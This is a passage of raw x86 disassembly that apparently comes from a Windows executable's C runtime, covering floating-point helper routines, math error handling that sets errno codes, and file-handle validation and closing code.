  40aba7:	db 2d a0 12 41 00    	fldt   0x4112a0
  40abad:	80 bd 70 ff ff ff 00 	cmpb   $0x0,-0x90(%ebp)
  40abb4:	7f 07                	jg     0x40abbd
  40abb6:	c6 85 70 ff ff ff 01 	movb   $0x1,-0x90(%ebp)
  40abbd:	0a c9                	or     %cl,%cl
  40abbf:	c3                   	ret
  40abc0:	dd d8                	fstp   %st(0)
  40abc2:	dd d8                	fstp   %st(0)
  40abc4:	db 2d b4 12 41 00    	fldt   0x4112b4
  40abca:	0a ed                	or     %ch,%ch
  40abcc:	74 02                	je     0x40abd0
  40abce:	d9 e0                	fchs
  40abd0:	0a c9                	or     %cl,%cl
  40abd2:	74 08                	je     0x40abdc
  40abd4:	dd 05 c6 12 41 00    	fldl   0x4112c6
  40abda:	de c9                	fmulp  %st,%st(1)
  40abdc:	c3                   	ret
  40abdd:	0a c9                	or     %cl,%cl
  40abdf:	74 02                	je     0x40abe3
  40abe1:	d9 e0                	fchs
  40abe3:	c3                   	ret
  40abe4:	cc                   	int3
  40abe5:	cc                   	int3
  40abe6:	cc                   	int3
  40abe7:	cc                   	int3
  40abe8:	cc                   	int3
  40abe9:	cc                   	int3
  40abea:	cc                   	int3
  40abeb:	cc                   	int3
  40abec:	cc                   	int3
  40abed:	cc                   	int3
  40abee:	cc                   	int3
  40abef:	cc                   	int3
  40abf0:	d9 c0                	fld    %st(0)
  40abf2:	d9 fc                	frndint
  40abf4:	dc e1                	fsub   %st,%st(1)
  40abf6:	d9 c9                	fxch   %st(1)
  40abf8:	d9 e0                	fchs
  40abfa:	d9 f0                	f2xm1
  40abfc:	d9 e8                	fld1
  40abfe:	de c1                	faddp  %st,%st(1)
  40ac00:	d9 fd                	fscale
  40ac02:	dd d9                	fstp   %st(1)
  40ac04:	c3                   	ret
  40ac05:	8b 54 24 04          	mov    0x4(%esp),%edx
  40ac09:	81 e2 00 03 00 00    	and    $0x300,%edx
  40ac0f:	83 ca 7f             	or     $0x7f,%edx
  40ac12:	66 89 54 24 06       	mov    %dx,0x6(%esp)
  40ac17:	d9 6c 24 06          	fldcw  0x6(%esp)
  40ac1b:	c3                   	ret
  40ac1c:	a9 00 00 08 00       	test   $0x80000,%eax
  40ac21:	74 06                	je     0x40ac29
  40ac23:	b8 00 00 00 00       	mov    $0x0,%eax
  40ac28:	c3                   	ret
  40ac29:	dc 05 e0 12 41 00    	faddl  0x4112e0
  40ac2f:	b8 00 00 00 00       	mov    $0x0,%eax
  40ac34:	c3                   	ret
  40ac35:	8b 42 04             	mov    0x4(%edx),%eax
  40ac38:	25 00 00 f0 7f       	and    $0x7ff00000,%eax
  40ac3d:	3d 00 00 f0 7f       	cmp    $0x7ff00000,%eax
  40ac42:	74 03                	je     0x40ac47
  40ac44:	dd 02                	fldl   (%edx)
  40ac46:	c3                   	ret
  40ac47:	8b 42 04             	mov    0x4(%edx),%eax
  40ac4a:	83 ec 0a             	sub    $0xa,%esp
  40ac4d:	0d 00 00 ff 7f       	or     $0x7fff0000,%eax
  40ac52:	89 44 24 06          	mov    %eax,0x6(%esp)
  40ac56:	8b 42 04             	mov    0x4(%edx),%eax
  40ac59:	8b 0a                	mov    (%edx),%ecx
  40ac5b:	0f a4 c8 0b          	shld   $0xb,%ecx,%eax
  40ac5f:	c1 e1 0b             	shl    $0xb,%ecx
  40ac62:	89 44 24 04          	mov    %eax,0x4(%esp)
  40ac66:	89 0c 24             	mov    %ecx,(%esp)
  40ac69:	db 2c 24             	fldt   (%esp)
  40ac6c:	83 c4 0a             	add    $0xa,%esp
  40ac6f:	a9 00 00 00 00       	test   $0x0,%eax
  40ac74:	8b 42 04             	mov    0x4(%edx),%eax
  40ac77:	c3                   	ret
  40ac78:	8b 44 24 08          	mov    0x8(%esp),%eax
  40ac7c:	25 00 00 f0 7f       	and    $0x7ff00000,%eax
  40ac81:	3d 00 00 f0 7f       	cmp    $0x7ff00000,%eax
  40ac86:	74 01                	je     0x40ac89
  40ac88:	c3                   	ret
  40ac89:	8b 44 24 08          	mov    0x8(%esp),%eax
  40ac8d:	c3                   	ret
  40ac8e:	66 81 3c 24 7f 02    	cmpw   $0x27f,(%esp)
  40ac94:	74 03                	je     0x40ac99
  40ac96:	d9 2c 24             	fldcw  (%esp)
  40ac99:	5a                   	pop    %edx
  40ac9a:	c3                   	ret
  40ac9b:	66 8b 04 24          	mov    (%esp),%ax
  40ac9f:	66 3d 7f 02          	cmp    $0x27f,%ax
  40aca3:	74 1e                	je     0x40acc3
  40aca5:	66 83 e0 20          	and    $0x20,%ax
  40aca9:	74 15                	je     0x40acc0
  40acab:	9b df e0             	fstsw  %ax
  40acae:	66 83 e0 20          	and    $0x20,%ax
  40acb2:	74 0c                	je     0x40acc0
  40acb4:	b8 08 00 00 00       	mov    $0x8,%eax
  40acb9:	e8 d9 00 00 00       	call   0x40ad97
  40acbe:	5a                   	pop    %edx
  40acbf:	c3                   	ret
  40acc0:	d9 2c 24             	fldcw  (%esp)
  40acc3:	5a                   	pop    %edx
  40acc4:	c3                   	ret
  40acc5:	83 ec 08             	sub    $0x8,%esp
  40acc8:	dd 14 24             	fstl   (%esp)
  40accb:	8b 44 24 04          	mov    0x4(%esp),%eax
  40accf:	83 c4 08             	add    $0x8,%esp
  40acd2:	25 00 00 f0 7f       	and    $0x7ff00000,%eax
  40acd7:	eb 14                	jmp    0x40aced
  40acd9:	83 ec 08             	sub    $0x8,%esp
  40acdc:	dd 14 24             	fstl   (%esp)
  40acdf:	8b 44 24 04          	mov    0x4(%esp),%eax
  40ace3:	83 c4 08             	add    $0x8,%esp
  40ace6:	25 00 00 f0 7f       	and    $0x7ff00000,%eax
  40aceb:	74 3d                	je     0x40ad2a
  40aced:	3d 00 00 f0 7f       	cmp    $0x7ff00000,%eax
  40acf2:	74 5f                	je     0x40ad53
  40acf4:	66 8b 04 24          	mov    (%esp),%ax
  40acf8:	66 3d 7f 02          	cmp    $0x27f,%ax
  40acfc:	74 2a                	je     0x40ad28
  40acfe:	66 83 e0 20          	and    $0x20,%ax
  40ad02:	75 21                	jne    0x40ad25
  40ad04:	9b df e0             	fstsw  %ax
  40ad07:	66 83 e0 20          	and    $0x20,%ax
  40ad0b:	74 18                	je     0x40ad25
  40ad0d:	b8 08 00 00 00       	mov    $0x8,%eax
  40ad12:	83 fa 1d             	cmp    $0x1d,%edx
  40ad15:	74 07                	je     0x40ad1e
  40ad17:	e8 7b 00 00 00       	call   0x40ad97
  40ad1c:	5a                   	pop    %edx
  40ad1d:	c3                   	ret
  40ad1e:	e8 5d 00 00 00       	call   0x40ad80
  40ad23:	5a                   	pop    %edx
  40ad24:	c3                   	ret
  40ad25:	d9 2c 24             	fldcw  (%esp)
  40ad28:	5a                   	pop    %edx
  40ad29:	c3                   	ret
  40ad2a:	dd 05 0c 13 41 00    	fldl   0x41130c
  40ad30:	d9 c9                	fxch   %st(1)
  40ad32:	d9 fd                	fscale
  40ad34:	dd d9                	fstp   %st(1)
  40ad36:	d9 c0                	fld    %st(0)
  40ad38:	d9 e1                	fabs
  40ad3a:	dc 1d fc 12 41 00    	fcompl 0x4112fc
  40ad40:	9b df e0             	fstsw  %ax
  40ad43:	9e                   	sahf
  40ad44:	b8 04 00 00 00       	mov    $0x4,%eax
  40ad49:	73 c7                	jae    0x40ad12
  40ad4b:	dc 0d 1c 13 41 00    	fmull  0x41131c
  40ad51:	eb bf                	jmp    0x40ad12
  40ad53:	dd 05 04 13 41 00    	fldl   0x411304
  40ad59:	d9 c9                	fxch   %st(1)
  40ad5b:	d9 fd                	fscale
  40ad5d:	dd d9                	fstp   %st(1)
  40ad5f:	d9 c0                	fld    %st(0)
  40ad61:	d9 e1                	fabs
  40ad63:	dc 1d f4 12 41 00    	fcompl 0x4112f4
  40ad69:	9b df e0             	fstsw  %ax
  40ad6c:	9e                   	sahf
  40ad6d:	b8 03 00 00 00       	mov    $0x3,%eax
  40ad72:	76 9e                	jbe    0x40ad12
  40ad74:	dc 0d 14 13 41 00    	fmull  0x411314
  40ad7a:	eb 96                	jmp    0x40ad12
  40ad7c:	cc                   	int3
  40ad7d:	cc                   	int3
  40ad7e:	cc                   	int3
  40ad7f:	cc                   	int3
  40ad80:	55                   	push   %ebp
  40ad81:	8b ec                	mov    %esp,%ebp
  40ad83:	83 c4 e0             	add    $0xffffffe0,%esp
  40ad86:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40ad89:	8b 45 18             	mov    0x18(%ebp),%eax
  40ad8c:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40ad8f:	8b 45 1c             	mov    0x1c(%ebp),%eax
  40ad92:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40ad95:	eb 09                	jmp    0x40ada0
  40ad97:	55                   	push   %ebp
  40ad98:	8b ec                	mov    %esp,%ebp
  40ad9a:	83 c4 e0             	add    $0xffffffe0,%esp
  40ad9d:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40ada0:	dd 5d f8             	fstpl  -0x8(%ebp)
  40ada3:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  40ada6:	8b 45 10             	mov    0x10(%ebp),%eax
  40ada9:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40adac:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40adaf:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  40adb2:	8d 45 08             	lea    0x8(%ebp),%eax
  40adb5:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40adb8:	50                   	push   %eax
  40adb9:	51                   	push   %ecx
  40adba:	52                   	push   %edx
  40adbb:	e8 af 06 00 00       	call   0x40b46f
  40adc0:	83 c4 0c             	add    $0xc,%esp
  40adc3:	dd 45 f8             	fldl   -0x8(%ebp)
  40adc6:	66 81 7d 08 7f 02    	cmpw   $0x27f,0x8(%ebp)
  40adcc:	74 03                	je     0x40add1
  40adce:	d9 6d 08             	fldcw  0x8(%ebp)
  40add1:	c9                   	leave
  40add2:	c3                   	ret
  40add3:	8b ff                	mov    %edi,%edi
  40add5:	55                   	push   %ebp
  40add6:	8b ec                	mov    %esp,%ebp
  40add8:	83 ec 24             	sub    $0x24,%esp
  40addb:	a1 00 40 41 00       	mov    0x414000,%eax
  40ade0:	33 c5                	xor    %ebp,%eax
  40ade2:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40ade5:	83 3d cc 51 41 00 00 	cmpl   $0x0,0x4151cc
  40adec:	56                   	push   %esi
  40aded:	57                   	push   %edi
  40adee:	74 10                	je     0x40ae00
  40adf0:	ff 35 dc 51 41 00    	push   0x4151dc
  40adf6:	ff 15 04 d0 40 00    	call   *0x40d004
  40adfc:	8b f8                	mov    %eax,%edi
  40adfe:	eb 05                	jmp    0x40ae05
  40ae00:	bf f5 42 40 00       	mov    $0x4042f5,%edi
  40ae05:	8b 45 14             	mov    0x14(%ebp),%eax
  40ae08:	83 f8 1a             	cmp    $0x1a,%eax
  40ae0b:	0f 8f 21 01 00 00    	jg     0x40af32
  40ae11:	0f 84 0f 01 00 00    	je     0x40af26
  40ae17:	83 f8 0e             	cmp    $0xe,%eax
  40ae1a:	0f 8f a7 00 00 00    	jg     0x40aec7
  40ae20:	0f 84 8e 00 00 00    	je     0x40aeb4
  40ae26:	6a 02                	push   $0x2
  40ae28:	59                   	pop    %ecx
  40ae29:	2b c1                	sub    %ecx,%eax
  40ae2b:	74 78                	je     0x40aea5
  40ae2d:	83 e8 01             	sub    $0x1,%eax
  40ae30:	74 6a                	je     0x40ae9c
  40ae32:	83 e8 05             	sub    $0x5,%eax
  40ae35:	74 56                	je     0x40ae8d
  40ae37:	83 e8 01             	sub    $0x1,%eax
  40ae3a:	0f 85 9b 01 00 00    	jne    0x40afdb
  40ae40:	c7 45 e0 28 13 41 00 	movl   $0x411328,-0x20(%ebp)
  40ae47:	8b 45 08             	mov    0x8(%ebp),%eax
  40ae4a:	8b cf                	mov    %edi,%ecx
  40ae4c:	8b 75 10             	mov    0x10(%ebp),%esi
  40ae4f:	c7 45 dc 01 00 00 00 	movl   $0x1,-0x24(%ebp)
  40ae56:	dd 00                	fldl   (%eax)
  40ae58:	8b 45 0c             	mov    0xc(%ebp),%eax
  40ae5b:	dd 5d e4             	fstpl  -0x1c(%ebp)
  40ae5e:	dd 00                	fldl   (%eax)
  40ae60:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40ae63:	dd 5d ec             	fstpl  -0x14(%ebp)
  40ae66:	dd 06                	fldl   (%esi)
  40ae68:	50                   	push   %eax
  40ae69:	dd 5d f4             	fstpl  -0xc(%ebp)
  40ae6c:	ff 15 3c d1 40 00    	call   *0x40d13c
  40ae72:	ff d7                	call   *%edi
  40ae74:	59                   	pop    %ecx
  40ae75:	85 c0                	test   %eax,%eax
  40ae77:	0f 85 59 01 00 00    	jne    0x40afd6
  40ae7d:	e8 77 ad ff ff       	call   0x405bf9
  40ae82:	c7 00 21 00 00 00    	movl   $0x21,(%eax)
  40ae88:	e9 49 01 00 00       	jmp    0x40afd6
  40ae8d:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  40ae90:	c7 45 e0 28 13 41 00 	movl   $0x411328,-0x20(%ebp)
  40ae97:	e9 04 01 00 00       	jmp    0x40afa0
  40ae9c:	c7 45 e0 24 13 41 00 	movl   $0x411324,-0x20(%ebp)
  40aea3:	eb a2                	jmp    0x40ae47
  40aea5:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  40aea8:	c7 45 e0 24 13 41 00 	movl   $0x411324,-0x20(%ebp)
  40aeaf:	e9 ec 00 00 00       	jmp    0x40afa0
  40aeb4:	c7 45 dc 03 00 00 00 	movl   $0x3,-0x24(%ebp)
  40aebb:	c7 45 e0 30 13 41 00 	movl   $0x411330,-0x20(%ebp)
  40aec2:	e9 d9 00 00 00       	jmp    0x40afa0
  40aec7:	83 e8 0f             	sub    $0xf,%eax
  40aeca:	74 51                	je     0x40af1d
  40aecc:	83 e8 09             	sub    $0x9,%eax
  40aecf:	74 43                	je     0x40af14
  40aed1:	83 e8 01             	sub    $0x1,%eax
  40aed4:	0f 85 01 01 00 00    	jne    0x40afdb
  40aeda:	c7 45 e0 34 13 41 00 	movl   $0x411334,-0x20(%ebp)
  40aee1:	8b 45 08             	mov    0x8(%ebp),%eax
  40aee4:	8b cf                	mov    %edi,%ecx
  40aee6:	8b 75 10             	mov    0x10(%ebp),%esi
  40aee9:	c7 45 dc 04 00 00 00 	movl   $0x4,-0x24(%ebp)
  40aef0:	dd 00                	fldl   (%eax)
  40aef2:	8b 45 0c             	mov    0xc(%ebp),%eax
  40aef5:	dd 5d e4             	fstpl  -0x1c(%ebp)
  40aef8:	dd 00                	fldl   (%eax)
  40aefa:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40aefd:	dd 5d ec             	fstpl  -0x14(%ebp)
  40af00:	dd 06                	fldl   (%esi)
  40af02:	50                   	push   %eax
  40af03:	dd 5d f4             	fstpl  -0xc(%ebp)
  40af06:	ff 15 3c d1 40 00    	call   *0x40d13c
  40af0c:	ff d7                	call   *%edi
  40af0e:	59                   	pop    %ecx
  40af0f:	e9 c2 00 00 00       	jmp    0x40afd6
  40af14:	c7 45 dc 03 00 00 00 	movl   $0x3,-0x24(%ebp)
  40af1b:	eb 7c                	jmp    0x40af99
  40af1d:	c7 45 e0 30 13 41 00 	movl   $0x411330,-0x20(%ebp)
  40af24:	eb bb                	jmp    0x40aee1
  40af26:	d9 e8                	fld1
  40af28:	8b 45 10             	mov    0x10(%ebp),%eax
  40af2b:	dd 18                	fstpl  (%eax)
  40af2d:	e9 a9 00 00 00       	jmp    0x40afdb
  40af32:	83 e8 1b             	sub    $0x1b,%eax
  40af35:	74 5b                	je     0x40af92
  40af37:	83 e8 01             	sub    $0x1,%eax
  40af3a:	74 4a                	je     0x40af86
  40af3c:	83 e8 15             	sub    $0x15,%eax
  40af3f:	74 39                	je     0x40af7a
  40af41:	83 e8 09             	sub    $0x9,%eax
  40af44:	74 28                	je     0x40af6e
  40af46:	83 e8 03             	sub    $0x3,%eax
  40af49:	74 17                	je     0x40af62
  40af4b:	2d ab 03 00 00       	sub    $0x3ab,%eax
  40af50:	74 09                	je     0x40af5b
  40af52:	83 e8 01             	sub    $0x1,%eax
  40af55:	0f 85 80 00 00 00    	jne    0x40afdb
  40af5b:	8b 45 08             	mov    0x8(%ebp),%eax
  40af5e:	dd 00                	fldl   (%eax)
  40af60:	eb c6                	jmp    0x40af28
  40af62:	c7 45 e0 38 13 41 00 	movl   $0x411338,-0x20(%ebp)
  40af69:	e9 d9 fe ff ff       	jmp    0x40ae47
  40af6e:	c7 45 e0 40 13 41 00 	movl   $0x411340,-0x20(%ebp)
  40af75:	e9 cd fe ff ff       	jmp    0x40ae47
  40af7a:	c7 45 e0 48 13 41 00 	movl   $0x411348,-0x20(%ebp)
  40af81:	e9 c1 fe ff ff       	jmp    0x40ae47
  40af86:	c7 45 e0 34 13 41 00 	movl   $0x411334,-0x20(%ebp)
  40af8d:	e9 b5 fe ff ff       	jmp    0x40ae47
  40af92:	c7 45 dc 02 00 00 00 	movl   $0x2,-0x24(%ebp)
  40af99:	c7 45 e0 34 13 41 00 	movl   $0x411334,-0x20(%ebp)
  40afa0:	8b 45 08             	mov    0x8(%ebp),%eax
  40afa3:	8b cf                	mov    %edi,%ecx
  40afa5:	8b 75 10             	mov    0x10(%ebp),%esi
  40afa8:	dd 00                	fldl   (%eax)
  40afaa:	8b 45 0c             	mov    0xc(%ebp),%eax
  40afad:	dd 5d e4             	fstpl  -0x1c(%ebp)
  40afb0:	dd 00                	fldl   (%eax)
  40afb2:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40afb5:	dd 5d ec             	fstpl  -0x14(%ebp)
  40afb8:	dd 06                	fldl   (%esi)
  40afba:	50                   	push   %eax
  40afbb:	dd 5d f4             	fstpl  -0xc(%ebp)
  40afbe:	ff 15 3c d1 40 00    	call   *0x40d13c
  40afc4:	ff d7                	call   *%edi
  40afc6:	59                   	pop    %ecx
  40afc7:	85 c0                	test   %eax,%eax
  40afc9:	75 0b                	jne    0x40afd6
  40afcb:	e8 29 ac ff ff       	call   0x405bf9
  40afd0:	c7 00 22 00 00 00    	movl   $0x22,(%eax)
  40afd6:	dd 45 f4             	fldl   -0xc(%ebp)
  40afd9:	dd 1e                	fstpl  (%esi)
  40afdb:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40afde:	5f                   	pop    %edi
  40afdf:	33 cd                	xor    %ebp,%ecx
  40afe1:	5e                   	pop    %esi
  40afe2:	e8 77 62 ff ff       	call   0x40125e
  40afe7:	8b e5                	mov    %ebp,%esp
  40afe9:	5d                   	pop    %ebp
  40afea:	c3                   	ret
  40afeb:	8b ff                	mov    %edi,%edi
  40afed:	55                   	push   %ebp
  40afee:	8b ec                	mov    %esp,%ebp
  40aff0:	51                   	push   %ecx
  40aff1:	51                   	push   %ecx
  40aff2:	53                   	push   %ebx
  40aff3:	56                   	push   %esi
  40aff4:	be ff ff 00 00       	mov    $0xffff,%esi
  40aff9:	56                   	push   %esi
  40affa:	68 3f 1b 00 00       	push   $0x1b3f
  40afff:	e8 18 e5 ff ff       	call   0x40951c
  40b004:	dd 45 08             	fldl   0x8(%ebp)
  40b007:	8b d8                	mov    %eax,%ebx
  40b009:	59                   	pop    %ecx
  40b00a:	59                   	pop    %ecx
  40b00b:	0f b7 4d 0e          	movzwl 0xe(%ebp),%ecx
  40b00f:	b8 f0 7f 00 00       	mov    $0x7ff0,%eax
  40b014:	23 c8                	and    %eax,%ecx
  40b016:	51                   	push   %ecx
  40b017:	51                   	push   %ecx
  40b018:	dd 1c 24             	fstpl  (%esp)
  40b01b:	66 3b c8             	cmp    %ax,%cx
  40b01e:	75 37                	jne    0x40b057
  40b020:	e8 35 0d 00 00       	call   0x40bd5a
  40b025:	48                   	dec    %eax
  40b026:	59                   	pop    %ecx
  40b027:	59                   	pop    %ecx
  40b028:	83 f8 02             	cmp    $0x2,%eax
  40b02b:	77 0e                	ja     0x40b03b
  40b02d:	56                   	push   %esi
  40b02e:	53                   	push   %ebx
  40b02f:	e8 e8 e4 ff ff       	call   0x40951c
  40b034:	dd 45 08             	fldl   0x8(%ebp)
  40b037:	59                   	pop    %ecx
  40b038:	59                   	pop    %ecx
  40b039:	eb 63                	jmp    0x40b09e
  40b03b:	dd 45 08             	fldl   0x8(%ebp)
  40b03e:	dd 05 50 13 41 00    	fldl   0x411350
  40b044:	53                   	push   %ebx
  40b045:	83 ec 10             	sub    $0x10,%esp
  40b048:	d8 c1                	fadd   %st(1),%st
  40b04a:	dd 5c 24 08          	fstpl  0x8(%esp)
  40b04e:	dd 1c 24             	fstpl  (%esp)
  40b051:	6a 0c                	push   $0xc
  40b053:	6a 08                	push   $0x8
  40b055:	eb 3f                	jmp    0x40b096
  40b057:	e8 1e 05 00 00       	call   0x40b57a
  40b05c:	dd 55 f8             	fstl   -0x8(%ebp)
  40b05f:	dd 45 08             	fldl   0x8(%ebp)
  40b062:	83 c4 08             	add    $0x8,%esp
  40b065:	dd e1                	fucom  %st(1)
  40b067:	df e0                	fnstsw %ax
  40b069:	f6 c4 44             	test   $0x44,%ah
  40b06c:	7a 12                	jp     0x40b080
  40b06e:	56                   	push   %esi
  40b06f:	dd d9                	fstp   %st(1)
  40b071:	53                   	push   %ebx
  40b072:	dd d8                	fstp   %st(0)
  40b074:	e8 a3 e4 ff ff       	call   0x40951c
  40b079:	dd 45 f8             	fldl   -0x8(%ebp)
  40b07c:	59                   	pop    %ecx
  40b07d:	59                   	pop    %ecx
  40b07e:	eb 1e                	jmp    0x40b09e
  40b080:	f6 c3 20             	test   $0x20,%bl
  40b083:	75 e9                	jne    0x40b06e
  40b085:	53                   	push   %ebx
  40b086:	83 ec 10             	sub    $0x10,%esp
  40b089:	d9 c9                	fxch   %st(1)
  40b08b:	dd 5c 24 08          	fstpl  0x8(%esp)
  40b08f:	dd 1c 24             	fstpl  (%esp)
  40b092:	6a 0c                	push   $0xc
  40b094:	6a 10                	push   $0x10
  40b096:	e8 29 05 00 00       	call   0x40b5c4
  40b09b:	83 c4 1c             	add    $0x1c,%esp
  40b09e:	5e                   	pop    %esi
  40b09f:	5b                   	pop    %ebx
  40b0a0:	8b e5                	mov    %ebp,%esp
  40b0a2:	5d                   	pop    %ebp
  40b0a3:	c3                   	ret
  40b0a4:	6a 0c                	push   $0xc
  40b0a6:	68 88 29 41 00       	push   $0x412988
  40b0ab:	e8 f0 6a ff ff       	call   0x401ba0
  40b0b0:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  40b0b4:	8b 45 08             	mov    0x8(%ebp),%eax
  40b0b7:	ff 30                	push   (%eax)
  40b0b9:	e8 65 c0 ff ff       	call   0x407123
  40b0be:	59                   	pop    %ecx
  40b0bf:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40b0c3:	8b 45 0c             	mov    0xc(%ebp),%eax
  40b0c6:	8b 00                	mov    (%eax),%eax
  40b0c8:	8b 30                	mov    (%eax),%esi
  40b0ca:	8b d6                	mov    %esi,%edx
  40b0cc:	c1 fa 06             	sar    $0x6,%edx
  40b0cf:	8b c6                	mov    %esi,%eax
  40b0d1:	83 e0 3f             	and    $0x3f,%eax
  40b0d4:	6b c8 30             	imul   $0x30,%eax,%ecx
  40b0d7:	8b 04 95 90 4f 41 00 	mov    0x414f90(,%edx,4),%eax
  40b0de:	f6 44 08 28 01       	testb  $0x1,0x28(%eax,%ecx,1)
  40b0e3:	74 0b                	je     0x40b0f0
  40b0e5:	56                   	push   %esi
  40b0e6:	e8 e2 00 00 00       	call   0x40b1cd
  40b0eb:	59                   	pop    %ecx
  40b0ec:	8b f0                	mov    %eax,%esi
  40b0ee:	eb 0e                	jmp    0x40b0fe
  40b0f0:	e8 04 ab ff ff       	call   0x405bf9
  40b0f5:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40b0fb:	83 ce ff             	or     $0xffffffff,%esi
  40b0fe:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  40b101:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40b108:	e8 0d 00 00 00       	call   0x40b11a
  40b10d:	8b c6                	mov    %esi,%eax
  40b10f:	e8 dc 6a ff ff       	call   0x401bf0
  40b114:	c2 0c 00             	ret    $0xc
  40b117:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  40b11a:	8b 45 10             	mov    0x10(%ebp),%eax
  40b11d:	ff 30                	push   (%eax)
  40b11f:	e8 22 c0 ff ff       	call   0x407146
  40b124:	59                   	pop    %ecx
  40b125:	c3                   	ret
  40b126:	8b ff                	mov    %edi,%edi
  40b128:	55                   	push   %ebp
  40b129:	8b ec                	mov    %esp,%ebp
  40b12b:	83 ec 0c             	sub    $0xc,%esp
  40b12e:	8b 45 08             	mov    0x8(%ebp),%eax
  40b131:	8d 4d ff             	lea    -0x1(%ebp),%ecx
  40b134:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40b137:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40b13a:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40b13d:	50                   	push   %eax
  40b13e:	ff 75 0c             	push   0xc(%ebp)
  40b141:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40b144:	50                   	push   %eax
  40b145:	e8 5a ff ff ff       	call   0x40b0a4
  40b14a:	8b e5                	mov    %ebp,%esp
  40b14c:	5d                   	pop    %ebp
  40b14d:	c3                   	ret
  40b14e:	8b ff                	mov    %edi,%edi
  40b150:	55                   	push   %ebp
  40b151:	8b ec                	mov    %esp,%ebp
  40b153:	51                   	push   %ecx
  40b154:	56                   	push   %esi
  40b155:	8b 75 08             	mov    0x8(%ebp),%esi
  40b158:	83 fe fe             	cmp    $0xfffffffe,%esi
  40b15b:	75 15                	jne    0x40b172
  40b15d:	e8 84 aa ff ff       	call   0x405be6
  40b162:	83 20 00             	andl   $0x0,(%eax)
  40b165:	e8 8f aa ff ff       	call   0x405bf9
  40b16a:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40b170:	eb 53                	jmp    0x40b1c5
  40b172:	85 f6                	test   %esi,%esi
  40b174:	78 37                	js     0x40b1ad
  40b176:	3b 35 90 51 41 00    	cmp    0x415190,%esi
  40b17c:	73 2f                	jae    0x40b1ad
  40b17e:	8b c6                	mov    %esi,%eax
  40b180:	8b d6                	mov    %esi,%edx
  40b182:	83 e0 3f             	and    $0x3f,%eax
  40b185:	c1 fa 06             	sar    $0x6,%edx
  40b188:	6b c8 30             	imul   $0x30,%eax,%ecx
  40b18b:	8b 04 95 90 4f 41 00 	mov    0x414f90(,%edx,4),%eax
  40b192:	f6 44 08 28 01       	testb  $0x1,0x28(%eax,%ecx,1)
  40b197:	74 14                	je     0x40b1ad
  40b199:	8d 45 08             	lea    0x8(%ebp),%eax
  40b19c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40b19f:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40b1a2:	50                   	push   %eax
  40b1a3:	56                   	push   %esi
  40b1a4:	e8 7d ff ff ff       	call   0x40b126
  40b1a9:	59                   	pop    %ecx
  40b1aa:	59                   	pop    %ecx
  40b1ab:	eb 1b                	jmp    0x40b1c8
  40b1ad:	e8 34 aa ff ff       	call   0x405be6
  40b1b2:	83 20 00             	andl   $0x0,(%eax)
  40b1b5:	e8 3f aa ff ff       	call   0x405bf9
  40b1ba:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40b1c0:	e8 78 a9 ff ff       	call   0x405b3d
  40b1c5:	83 c8 ff             	or     $0xffffffff,%eax
  40b1c8:	5e                   	pop    %esi
  40b1c9:	8b e5                	mov    %ebp,%esp
  40b1cb:	5d                   	pop    %ebp
  40b1cc:	c3                   	ret
  40b1cd:	8b ff                	mov    %edi,%edi
  40b1cf:	55                   	push   %ebp
  40b1d0:	8b ec                	mov    %esp,%ebp
  40b1d2:	56                   	push   %esi
  40b1d3:	57                   	push   %edi
  40b1d4:	8b 7d 08             	mov    0x8(%ebp),%edi
  40b1d7:	57                   	push   %edi
  40b1d8:	e8 1d c0 ff ff       	call   0x4071fa
  40b1dd:	59                   	pop    %ecx
  40b1de:	83 f8 ff             	cmp    $0xffffffff,%eax
  40b1e1:	75 04                	jne    0x40b1e7
  40b1e3:	33 f6                	xor    %esi,%esi
  40b1e5:	eb 4e                	jmp    0x40b235
  40b1e7:	a1 90 4f 41 00       	mov    0x414f90,%eax
  40b1ec:	83 ff 01             	cmp    $0x1,%edi
  40b1ef:	75 09                	jne    0x40b1fa
  40b1f1:	f6 80 88 00 00 00 01 	testb  $0x1,0x88(%eax)
  40b1f8:	75 0b                	jne    0x40b205
  40b1fa:	83 ff 02             	cmp    $0x2,%edi
  40b1fd:	75 1c                	jne    0x40b21b
  40b1ff:	f6 40 58 01          	testb  $0x1,0x58(%eax)
  40b203:	74 16                	je     0x40b21b
  40b205:	6a 02                	push   $0x2
  40b207:	e8 ee bf ff ff       	call   0x4071fa
  40b20c:	6a 01                	push   $0x1
  40b20e:	8b f0                	mov    %eax,%esi
  40b210:	e8 e5 bf ff ff       	call   0x4071fa
  40b215:	59                   	pop    %ecx
  40b216:	59                   	pop    %ecx
  40b217:	3b c6                	cmp    %esi,%eax
  40b219:	74 c8                	je     0x40b1e3
  40b21b:	57                   	push   %edi
  40b21c:	e8 d9 bf ff ff       	call   0x4071fa
  40b221:	59                   	pop    %ecx
  40b222:	50                   	push   %eax
  40b223:	ff 15 cc d0 40 00    	call   *0x40d0cc
  40b229:	85 c0                	test   %eax,%eax
  40b22b:	75 b6                	jne    0x40b1e3
  40b22d:	ff 15 74 d0 40 00    	call   *0x40d074
  40b233:	8b f0                	mov    %eax,%esi
